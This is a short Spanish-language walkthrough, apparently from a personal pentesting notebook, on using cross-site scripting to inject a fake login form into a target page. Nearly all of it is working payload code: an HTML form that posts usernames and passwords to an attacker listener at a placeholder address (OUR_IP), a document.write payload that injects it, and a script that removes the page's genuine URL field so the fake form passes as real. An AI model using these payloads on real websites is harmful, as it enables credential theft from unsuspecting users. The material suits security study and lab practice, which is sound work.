## Inyeccion de formulario de inicio de sesion

Una vez identificado inyectamos un HTML con el formulario de inicio de sesion en la pagina objetivo que enviara la informacion de inicio de sesion a un servidor que tendremos en escucha

1. En este codigo cambiamos OUR_IP por nuestra IP:

```
<h3>Please login to continue</h3> 
<form action=http://OUR_IP> 
	<input type="username" name="username" placeholder="Username"> 
	<input type="password" name="password" placeholder="Password"> 
	<input type="submit" name="submit" value="Login"> 
</form>
```


2. Preparamos el payload:

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Limpiando

Vemos que aun sale el campo de URL por lo que vamos a intentar eliminarlo:

```
<script> document.getElementById("urlform").remove() </script>
```
![[Pasted image 20260716133126.png]]

Añadimos el codigo a nuestro payload JS anterior y ya se eliminara:

```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

![[Pasted image 20260716133245.png]]
